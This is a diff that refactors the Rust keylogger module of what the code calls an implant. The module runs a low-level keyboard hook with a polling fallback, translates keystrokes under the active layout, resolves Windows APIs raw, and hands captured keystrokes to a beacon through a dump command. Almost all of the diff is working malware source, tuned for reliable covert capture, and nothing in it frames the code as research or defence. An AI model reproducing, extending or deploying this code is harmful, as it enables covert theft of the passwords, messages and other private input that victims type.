@@ -508,9 +508,42 @@ unsafe extern "system" fn keylog_hook_thread(param: usize) -> u32 {
         .tid
         .store(my_tid, core::sync::atomic::Ordering::Release);
 
-    // Install the LL keyboard hook. The callback is `keylog_hook_proc` below;
-    // hmod is null for LL hooks (the callback must be in our .text — but we
-    // don't load a separate DLL).
+    // Install the LL keyboard hook and publish HOOK_THREAD_LIVE (see
+    // keylog_hook_thread_install_hook). Hook-install failure exits with 2,
+    // leaving HOOK_THREAD_LIVE false.
+    if !keylog_hook_thread_install_hook(params, set_hook) {
+        return 2;
+    }
+
+    // Message pump (see keylog_hook_thread_message_pump): GetMessage blocks
+    // until a message arrives; the hook callback runs on THIS thread's stack
+    // via the Windows hook dispatch. Returns on WM_QUIT or error.
+    keylog_hook_thread_message_pump(get_message);
+
+    // Cleanup: unhook (if the beacon hasn't already).
+    keylog_hook_thread_unhook(params, raw.unhook_windows_hook_ex);
+    0
+}
+
+/// Install the LL keyboard hook. The callback is `keylog_hook_proc` below;
+/// hmod is null for LL hooks (the callback must be in our .text — but we
+/// don't load a separate DLL). Returns false on install failure (the thread
+/// exits, leaving HOOK_THREAD_LIVE false).
+///
+/// CRITICAL-12 fix: the HOOK_THREAD_LIVE flag is the gate that stops the
+/// beacon polling path from writing BUF (see `poll_once`). It MUST be
+/// published BEFORE this thread can possibly call `buf_push_release` —
+/// which happens as soon as the message pump starts dispatching the hook
+/// callback. Previously the beacon thread set this flag AFTER CreateThread
+/// returned, so a keystroke landing in the gap let the hook callback and the
+/// beacon's `buf_push` race the same byte. Now the hook thread publishes it
+/// itself, with Release ordering, immediately after SetWindowsHookExW
+/// succeeds and before entering the pump — so any subsequent Acquire read by
+/// the polling path is guaranteed to see it before the first hook write.
+unsafe fn keylog_hook_thread_install_hook(
+    params: *mut KeylogThreadParams,
+    set_hook: SetWindowsHookExWFn,
+) -> bool {
     let hhook = unsafe {
         set_hook(
             WH_KEYBOARD_LL,
@@ -521,26 +554,20 @@ unsafe extern "system" fn keylog_hook_thread(param: usize) -> u32 {
     };
     if hhook.is_null() {
         // Hook install failed — exit, leaving HOOK_THREAD_LIVE false.
-        return 2;
+        return false;
     }
     (*params)
         .hhook
         .store(hhook as usize, core::sync::atomic::Ordering::Release);
 
-    // CRITICAL-12 fix: the HOOK_THREAD_LIVE flag is the gate that stops the
-    // beacon polling path from writing BUF (see `poll_once`). It MUST be
-    // published BEFORE this thread can possibly call `buf_push_release` —
-    // which happens as soon as the message pump starts dispatching the hook
-    // callback. Previously the beacon thread set this flag AFTER CreateThread
-    // returned, so a keystroke landing in the gap let the hook callback and the
-    // beacon's `buf_push` race the same byte. Now the hook thread publishes it
-    // itself, with Release ordering, immediately after SetWindowsHookExW
-    // succeeds and before entering the pump — so any subsequent Acquire read by
-    // the polling path is guaranteed to see it before the first hook write.
     HOOK_THREAD_LIVE.store(true, core::sync::atomic::Ordering::Release);
+    true
+}
 
-    // Message pump. GetMessage blocks until a message arrives (the hook
-    // callback runs on THIS thread's stack via the Windows hook dispatch).
+/// Message pump. GetMessage blocks until a message arrives (the hook callback
+/// runs on THIS thread's stack via the Windows hook dispatch). Returns when
+/// GetMessageW returns 0 (WM_QUIT) or -1 (error).
+unsafe fn keylog_hook_thread_message_pump(get_message: GetMessageWFn) {
     let mut msg = Msg {
         hwnd: core::ptr::null_mut(),
         message: 0,
@@ -556,16 +583,19 @@ unsafe extern "system" fn keylog_hook_thread(param: usize) -> u32 {
             break; // WM_QUIT or error
         }
     }
+}
 
-    // Cleanup: unhook (if the beacon hasn't already).
-    let unhook: UnhookWindowsHookExFn = core::mem::transmute(raw.unhook_windows_hook_ex);
+/// Cleanup: unhook the LL hook if the beacon hasn't already (the beacon's
+/// stop path swaps the stored HHOOK to 0 first, so a prev of 0 means the
+/// beacon owns the teardown).
+unsafe fn keylog_hook_thread_unhook(params: *mut KeylogThreadParams, unhook_addr: usize) {
+    let unhook: UnhookWindowsHookExFn = core::mem::transmute(unhook_addr);
     let prev = (*params)
         .hhook
         .swap(0, core::sync::atomic::Ordering::AcqRel);
     if prev != 0 {
         unsafe { unhook(prev as *mut core::ffi::c_void) };
     }
-    0
 }
 
 /// The `WH_KEYBOARD_LL` callback. Runs on the hook thread (in the message
@@ -804,14 +834,33 @@ fn map_vkey_layout_aware(vk: i32, shift: bool) -> Option<u8> {
         _ => {}
     }
 
-    // SAFETY: the four fn pointers are valid user32 exports; HKL belongs to
-    // the calling thread (the beacon loop thread). The 256-byte keyState and
-    // 8-u16 wbuf live on the stack.
+    // Snapshot the active thread's HKL + keyboard state; fall back to the US
+    // table if either API is unavailable (see map_vkey_layout_aware_state).
+    let (hkl, key_state) = match map_vkey_layout_aware_state(get_layout, get_state) {
+        Some(s) => s,
+        None => return map_vkey(vk, shift),
+    };
+
+    // Translate vk → glyph under the active layout, keeping only the ASCII
+    // range (see map_vkey_layout_aware_translate).
+    map_vkey_layout_aware_translate(vk, shift, hkl, &key_state, map_vk, to_uni)
+}
+
+/// Snapshot the active thread's HKL and full 256-byte keyboard state. Returns
+/// None if either API is unavailable (caller falls back to the US table so
+/// capture degrades gracefully rather than dropping keystrokes).
+fn map_vkey_layout_aware_state(
+    get_layout: GetKeyboardLayoutFn,
+    get_state: GetKeyboardStateFn,
+) -> Option<(Hkl, [u8; 256])> {
+    // SAFETY: the fn pointers are valid user32 exports; HKL belongs to the
+    // calling thread (the beacon loop thread). The 256-byte keyState lives on
+    // the stack.
     // SAFETY: get_layout(0) returns the current thread's HKL (never null on a
     // GUI-capable thread; on a non-GUI thread it may be the system layout).
     let hkl = unsafe { get_layout(0) };
     if hkl.is_null() {
-        return map_vkey(vk, shift);
+        return None;
     }
 
     let mut key_state: [u8; 256] = [0; 256];
@@ -819,9 +868,25 @@ fn map_vkey_layout_aware(vk: i32, shift: bool) -> Option<u8> {
     if unsafe { get_state(key_state.as_mut_ptr()) } == 0 {
         // GetKeyboardState failed (e.g. no input queue on this thread). Fall
         // back to the US table so we still capture something.
-        return map_vkey(vk, shift);
+        return None;
     }
+    Some((hkl, key_state))
+}
 
+/// Translate the vk to a glyph under the active layout via MapVirtualKeyExW +
+/// ToUnicodeEx. n < 0 → dead key (combining diacritic); skip it (no standalone
+/// glyph). n == 0 → no translation for this vk in this state; skip. n >= 1 →
+/// first code unit is the glyph. Dead keys / untranslatable keys fall back to
+/// the US table so US-layout keys still capture on a misidentified layout;
+/// non-ASCII glyphs (>= 0x80) are skipped — recording only the ASCII range.
+fn map_vkey_layout_aware_translate(
+    vk: i32,
+    shift: bool,
+    hkl: Hkl,
+    key_state: &[u8; 256],
+    map_vk: MapVirtualKeyExWFn,
+    to_uni: ToUnicodeExFn,
+) -> Option<u8> {
     // Scan code for this vk under the active layout.
     // SAFETY: vk is a valid virtual-key code; hkl is a real HKL.
     let scan = unsafe { map_vk(vk as u32, MAPVK_VK_TO_VSC, hkl) };
@@ -841,9 +906,6 @@ fn map_vkey_layout_aware(vk: i32, shift: bool) -> Option<u8> {
             hkl,
         )
     };
-    // n < 0 → dead key (combining diacritic); skip it (no standalone glyph).
-    // n == 0 → no translation for this vk in this state; skip.
-    // n >= 1 → first code unit is the glyph.
     if n < 1 {
         // Either a dead key or untranslatable — fall back to the US table so
         // US-layout keys still capture on a misidentified layout.
@@ -942,6 +1004,19 @@ pub fn poll_once() {
     // Letters are uppercase iff Shift XOR CapsLock.
     let upper_for_letters = shift ^ caps;
 
+    // Scan all 256 virtual keys for keydown transitions (see
+    // poll_once_scan_keys).
+    poll_once_scan_keys(gaks, shift, upper_for_letters);
+}
+
+/// Scan all 256 virtual keys, recording each fresh keydown transition
+/// (was up → now down) of a printable key into BUF via the layout-aware map.
+/// Updates LAST[vk] for every key (down → 1, up → 0) regardless of recording.
+fn poll_once_scan_keys(
+    gaks: unsafe extern "system" fn(i32) -> i16,
+    shift: bool,
+    upper_for_letters: bool,
+) {
     // Raw pointer to LAST so we never form a shared/mut ref to the static.
     // SAFETY: only the beacon thread touches LAST.
     let last_ptr: *mut u8 = core::ptr::addr_of_mut!(LAST).cast::<u8>();
@@ -998,6 +1073,34 @@ fn start_hook_thread() -> bool {
         Some(r) => r,
         None => return false,
     };
+    // Allocate + leak the param block and spawn the thread (see
+    // start_hook_thread_spawn; on spawn failure the block is reclaimed
+    // there and None returned).
+    let params = match start_hook_thread_spawn(raw) {
+        Some(p) => p,
+        None => return false,
+    };
+    // Spin briefly until the hook thread records its TID (it needs to be
+    // running before we can stop it). ~1ms cap (see
+    // start_hook_thread_wait_tid).
+    start_hook_thread_wait_tid(params);
+    // CRITICAL-12: do NOT publish HOOK_THREAD_LIVE from the beacon thread —
+    // see start_hook_thread_wait_live for the full reasoning. Returns whether
+    // the hook thread published liveness itself.
+    if !start_hook_thread_wait_live() {
+        // The hook thread did not publish liveness — either SetWindowsHookExW
+        // failed (thread returned 2) or it stalled. Treat as not-started: the
+        // polling path stays the writer, and we tear down the failed thread.
+        stop_hook_thread();
+        return false;
+    }
+    true
+}
+
+/// Allocate + leak the param block and spawn the hook thread via
+/// `raw_create_thread`. Returns the leaked params pointer on success; on
+/// spawn failure the param block is reclaimed here and None returned.
+fn start_hook_thread_spawn(raw: HookRaw) -> Option<*mut KeylogThreadParams> {
     // Allocate + leak the param block. The hook thread reads it; we reclaim on
     // stop (via Box::from_raw) — but if stop never runs, this leaks one block
     // (acceptable for an implant that lives until exit).
@@ -1015,7 +1118,7 @@ fn start_hook_thread() -> bool {
         None => {
             // Thread spawn failed — reclaim the param block.
             unsafe { drop(Box::from_raw(params)) };
-            return false;
+            return None;
         }
     };
     HOOK_THREAD_HANDLE.store(handle, Ordering::Release);
@@ -1023,8 +1126,12 @@ fn start_hook_thread() -> bool {
     unsafe {
         HOOK_PARAMS = params;
     }
-    // Spin briefly until the hook thread records its TID (it needs to be
-    // running before we can stop it). ~1ms cap.
+    Some(params)
+}
+
+/// Spin briefly until the hook thread records its TID (it needs to be
+/// running before we can stop it). ~1ms cap.
+fn start_hook_thread_wait_tid(params: *mut KeylogThreadParams) {
     for _ in 0..100 {
         let tid = unsafe { (*params).tid.load(Ordering::Acquire) };
         if tid != 0 {
@@ -1036,16 +1143,22 @@ fn start_hook_thread() -> bool {
         // trivial; the thread typically publishes its TID within microseconds.
         core::hint::spin_loop();
     }
-    // CRITICAL-12: do NOT publish HOOK_THREAD_LIVE from the beacon thread.
-    // The hook thread sets it itself (Release, after SetWindowsHookExW) so the
-    // flag can never be observed true before the hook thread is actually the
-    // sole owner of BUF writes. Wait here for that publication (Acquire) so
-    // `start_hook_thread` only returns success once the BUF-write ownership
-    // handoff is fully published — a beacon-side `poll_once` running
-    // immediately after we return will see HOOK_THREAD_LIVE and skip.
-    // If the hook thread failed to install the hook (returned 2 before setting
-    // the flag) we fall through after the spin cap and return false so the
-    // caller falls back to polling; the thread itself exits and is joined.
+}
+
+/// Wait for the hook thread to publish HOOK_THREAD_LIVE (Acquire). Returns
+/// true once it is live.
+///
+/// CRITICAL-12: do NOT publish HOOK_THREAD_LIVE from the beacon thread. The
+/// hook thread sets it itself (Release, after SetWindowsHookExW) so the flag
+/// can never be observed true before the hook thread is actually the sole
+/// owner of BUF writes. Wait here for that publication (Acquire) so
+/// `start_hook_thread` only returns success once the BUF-write ownership
+/// handoff is fully published — a beacon-side `poll_once` running
+/// immediately after we return will see HOOK_THREAD_LIVE and skip.
+/// If the hook thread failed to install the hook (returned 2 before setting
+/// the flag) we fall through after the spin cap and return false so the
+/// caller falls back to polling; the thread itself exits and is joined.
+fn start_hook_thread_wait_live() -> bool {
     let mut live = false;
     for _ in 0..200 {
         if HOOK_THREAD_LIVE.load(Ordering::Acquire) {
@@ -1054,14 +1167,7 @@ fn start_hook_thread() -> bool {
         }
         core::hint::spin_loop();
     }
-    if !live {
-        // The hook thread did not publish liveness — either SetWindowsHookExW
-        // failed (thread returned 2) or it stalled. Treat as not-started: the
-        // polling path stays the writer, and we tear down the failed thread.
-        stop_hook_thread();
-        return false;
-    }
-    true
+    live
 }
 
 /// Stop + join the hook thread (P2). Posts `WM_QUIT` to its message pump,
@@ -1079,20 +1185,42 @@ fn stop_hook_thread() {
     // Read the TID the hook thread published.
     let tid = unsafe { (*params).tid.load(Ordering::Acquire) };
     if tid != 0 {
-        // Post WM_QUIT via raw export (the beacon thread CAN use syscalls, but
-        // PostThreadMessageW is a user32 export — resolve it raw to keep
-        // symmetry with the hook thread's resolution).
-        if let Some(addr) =
-            unsafe { crate::resolve::export_addr(b"user32.dll", b"PostThreadMessageW") }
-        {
-            let f: PostThreadMessageWFn = unsafe { core::mem::transmute(addr) };
-            // SAFETY: tid is a real Win32 TID; WM_QUIT takes no payload.
-            unsafe { f(tid, WM_QUIT, 0, 0) };
-        }
+        // Post WM_QUIT via raw export (see stop_hook_thread_post_quit).
+        stop_hook_thread_post_quit(tid);
     }
-    // Join: WaitForSingleObject via raw kernel32 export. Give it 2s; if the
-    // hook thread is stuck (e.g. blocked in GetMessage with no message), the
-    // WM_QUIT we just posted should wake it.
+    // Join + close the thread handle via raw kernel32 exports (see
+    // stop_hook_thread_join). Give it 2s; if the hook thread is stuck (e.g.
+    // blocked in GetMessage with no message), the WM_QUIT we just posted
+    // should wake it.
+    stop_hook_thread_join(handle);
+    HOOK_THREAD_LIVE.store(false, Ordering::Release);
+    // Reclaim the param block.
+    // SAFETY: HOOK_PARAMS is only mutated on the beacon thread; the hook
+    // thread has exited (we just joined it).
+    unsafe {
+        let _ = Box::from_raw(params);
+        HOOK_PARAMS = core::ptr::null_mut();
+    }
+}
+
+/// Post WM_QUIT via raw export (the beacon thread CAN use syscalls, but
+/// PostThreadMessageW is a user32 export — resolve it raw to keep symmetry
+/// with the hook thread's resolution).
+fn stop_hook_thread_post_quit(tid: u32) {
+    if let Some(addr) =
+        unsafe { crate::resolve::export_addr(b"user32.dll", b"PostThreadMessageW") }
+    {
+        let f: PostThreadMessageWFn = unsafe { core::mem::transmute(addr) };
+        // SAFETY: tid is a real Win32 TID; WM_QUIT takes no payload.
+        unsafe { f(tid, WM_QUIT, 0, 0) };
+    }
+}
+
+/// Join: WaitForSingleObject via raw kernel32 export, then close the thread
+/// handle. Give it 2s; if the hook thread is stuck (e.g. blocked in
+/// GetMessage with no message), the WM_QUIT posted by the caller should wake
+/// it.
+fn stop_hook_thread_join(handle: usize) {
     if let Some(wait_addr) =
         unsafe { crate::resolve::export_addr(b"kernel32.dll", b"WaitForSingleObject") }
     {
@@ -1109,14 +1237,6 @@ fn stop_hook_thread() {
         let close: CloseFn = unsafe { core::mem::transmute(close_addr) };
         // SAFETY: handle was just waited on; closing is safe.
         let _ = unsafe { close(handle as *mut core::ffi::c_void) };
-    }
-    HOOK_THREAD_LIVE.store(false, Ordering::Release);
-    // Reclaim the param block.
-    // SAFETY: HOOK_PARAMS is only mutated on the beacon thread; the hook
-    // thread has exited (we just joined it).
-    unsafe {
-        let _ = Box::from_raw(params);
-        HOOK_PARAMS = core::ptr::null_mut();
     }
 }
 
@@ -1136,108 +1256,110 @@ pub fn do_keylog(action: u8) -> Response {
             stop_hook_thread();
             Response::Ok
         }
-        2 => {
-            // Drain the captured bytes into a Vec, then reset for the next
-            // capture window. Only this path allocates; poll_once stays
-            // allocation-free.
-            //
-            // CRITICAL-12 dump discipline (see module docs): a dump must
-            // NEVER read a reserved-but-unwritten slot. A writer that CAS-
-            // claimed index `i` may not have stored `BUF[i]` yet, and an
-            // unconditional reset of the head could hand a re-claimed index
-            // to a new writer while the original owner is still mid-write
-            // (violating the single-writer-per-byte invariant). The dump
-            // therefore takes the same CAS discipline as the writers:
-            //   1. Seal the claim head (`compare_exchange(head, BUF_CAP)`) so
-            //      no new writer can claim while we drain. Writers racing the
-            //      seal either land their CAS before it (their index is
-            //      included in the frozen region) or fail and drop (buffer
-            //      appears full — documented drop-newest behavior).
-            //   2. Quiesce: wait until every claimed index < head has its
-            //      byte published via `BUF_READY` (Release by the writer
-            //      after its store; Acquire here). The seal guarantees no new
-            //      claims can start, and each in-flight writer publishes
-            //      within a finite number of instructions — panic=abort turns
-            //      a writer fault into process death, so the wait cannot hang.
-            //   3. Copy `[0..head)` — every slot is fully written.
-            //   4. Clear `BUF_READY[0..head)` while the head is still sealed,
-            //      then reopen the head to 0. New-epoch writers re-claim from
-            //      0 only after the reopen, so a fresh publish can never be
-            //      clobbered by a stale clear, and no two writers ever own
-            //      the same byte.
-            let mut head = BUF_LEN.load(Ordering::Acquire);
-            if head != 0 {
-                loop {
-                    match BUF_LEN.compare_exchange(
-                        head,
-                        BUF_CAP,
-                        Ordering::AcqRel,
-                        Ordering::Acquire,
-                    ) {
-                        Ok(_) => break, // sealed at `head`.
-                        Err(actual) => head = actual, // a writer claimed past us; re-seal.
-                    }
-                }
-                // Quiesce: wait for every in-flight writer to publish its byte.
-                loop {
-                    let mut pending = false;
-                    for i in 0..head {
-                        if !BUF_READY[i].load(Ordering::Acquire) {
-                            pending = true;
-                            break;
-                        }
-                    }
-                    if !pending {
-                        break;
-                    }
-                    core::hint::spin_loop();
-                }
-            }
-            let mut out: Vec<u8> = Vec::with_capacity(head);
-            // SAFETY: head <= BUF_CAP (writers never claim past the cap) and
-            // every slot in [0..head) was published by its owning writer
-            // (quiesced above) — this copy never touches a reserved-but-
-            // unwritten byte. Read through a raw pointer to avoid forming a
-            // `&static mut` (static_mut_refs lint).
-            unsafe {
-                let ptr: *const u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
-                for i in 0..head {
-                    out.push(*ptr.add(i));
-                }
-            }
-            if head != 0 {
-                // Clear the publish flags for the drained region while the
-                // head is still sealed, then reopen the buffer. No writer can
-                // claim or publish between the clear and the reopen, so a
-                // next-epoch publish can never be clobbered by a stale clear.
-                for i in 0..head {
-                    BUF_READY[i].store(false, Ordering::Relaxed);
-                }
-                BUF_LEN.store(0, Ordering::Release);
-            }
-            Response::Output(out)
-        }
+        2 => do_keylog_dump(),
         // Unknown action tag — protocol-valid u8 but not 0/1/2. Surface as Err
         // (matches recon.rs error style) rather than panicking.
-        other => Response::Err({
-            let mut e = String::new();
-            e.push_str("keylog: unknown action ");
-            // Decimal-encode the byte without format! (no_std).
-            let mut buf = [0u8; 3];
-            let mut n = 0usize;
-            let mut v = other as u32;
-            if v == 0 {
-                buf[0] = b'0';
-                n = 1;
-            } else {
-                while v != 0 {
-                    n += 1;
-                    buf[buf.len() - n] = b'0' + (v % 10) as u8;
-                    v /= 10;
+        other => Response::Err(do_keylog_unknown_action(other)),
+    }
+}
+
+/// Drain the captured bytes into a Vec, then reset for the next capture
+/// window. Only this path allocates; poll_once stays allocation-free. An
+/// empty buffer yields an empty `Output`, not an error.
+///
+/// CRITICAL-12 dump discipline (see module docs): a dump must NEVER read a
+/// reserved-but-unwritten slot. [`do_keylog_seal_and_quiesce`] seals the
+/// claim head and waits for every in-flight writer to publish its byte
+/// (steps 1-2 of the discipline); this fn then copies `[0..head)` (every slot
+/// is fully written), clears `BUF_READY[0..head)` while the head is still
+/// sealed, and reopens the head to 0 (steps 3-4). New-epoch writers re-claim
+/// from 0 only after the reopen, so a fresh publish can never be clobbered by
+/// a stale clear, and no two writers ever own the same byte.
+fn do_keylog_dump() -> Response {
+    let head = do_keylog_seal_and_quiesce();
+    let mut out: Vec<u8> = Vec::with_capacity(head);
+    // SAFETY: head <= BUF_CAP (writers never claim past the cap) and
+    // every slot in [0..head) was published by its owning writer
+    // (quiesced above) — this copy never touches a reserved-but-
+    // unwritten byte. Read through a raw pointer to avoid forming a
+    // `&static mut` (static_mut_refs lint).
+    unsafe {
+        let ptr: *const u8 = core::ptr::addr_of_mut!(BUF).cast::<u8>();
+        for i in 0..head {
+            out.push(*ptr.add(i));
+        }
+    }
+    if head != 0 {
+        // Clear the publish flags for the drained region while the
+        // head is still sealed, then reopen the buffer. No writer can
+        // claim or publish between the clear and the reopen, so a
+        // next-epoch publish can never be clobbered by a stale clear.
+        for i in 0..head {
+            BUF_READY[i].store(false, Ordering::Relaxed);
+        }
+        BUF_LEN.store(0, Ordering::Release);
+    }
+    Response::Output(out)
+}
+
+/// CRITICAL-12 dump discipline steps 1-2: seal the claim head
+/// (`compare_exchange(head, BUF_CAP)`) so no new writer can claim while we
+/// drain, then quiesce — wait until every claimed index < head has its byte
+/// published via `BUF_READY` (Release by the writer after its store; Acquire
+/// here). The seal guarantees no new claims can start, and each in-flight
+/// writer publishes within a finite number of instructions — panic=abort
+/// turns a writer fault into process death, so the wait cannot hang. Returns
+/// the sealed head.
+fn do_keylog_seal_and_quiesce() -> usize {
+    let mut head = BUF_LEN.load(Ordering::Acquire);
+    if head != 0 {
+        loop {
+            match BUF_LEN.compare_exchange(
+                head,
+                BUF_CAP,
+                Ordering::AcqRel,
+                Ordering::Acquire,
+            ) {
+                Ok(_) => break, // sealed at `head`.
+                Err(actual) => head = actual, // a writer claimed past us; re-seal.
+            }
+        }
+        // Quiesce: wait for every in-flight writer to publish its byte.
+        loop {
+            let mut pending = false;
+            for i in 0..head {
+                if !BUF_READY[i].load(Ordering::Acquire) {
+                    pending = true;
+                    break;
                 }
             }
-            e.push_str(core::str::from_utf8(&buf[buf.len() - n..]).unwrap_or("?"));
-            e
-        }),
+            if !pending {
+                break;
+            }
+            core::hint::spin_loop();
+        }
     }
+    head
+}
+
+/// Decimal-encode the unknown action tag without format! (no_std) into the
+/// "keylog: unknown action N" error string.
+fn do_keylog_unknown_action(other: u8) -> String {
+    let mut e = String::new();
+    e.push_str("keylog: unknown action ");
+    let mut buf = [0u8; 3];
+    let mut n = 0usize;
+    let mut v = other as u32;
+    if v == 0 {
+        buf[0] = b'0';
+        n = 1;
+    } else {
+        while v != 0 {
+            n += 1;
+            buf[buf.len() - n] = b'0' + (v % 10) as u8;
+            v /= 10;
+        }
+    }
+    e.push_str(core::str::from_utf8(&buf[buf.len() - n..]).unwrap_or("?"));
+    e
 }
